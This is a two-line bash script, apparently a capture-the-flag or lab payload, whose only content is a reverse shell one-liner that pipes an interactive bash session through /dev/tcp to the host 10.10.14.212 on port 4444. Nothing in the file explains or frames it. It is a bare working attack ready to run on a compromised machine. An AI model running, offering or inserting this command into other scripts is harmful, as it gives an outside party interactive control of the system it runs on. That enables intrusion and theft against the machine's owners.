#!/bin/bash

bash -i >& /dev/tcp/10.10.14.212/4444 0>&1
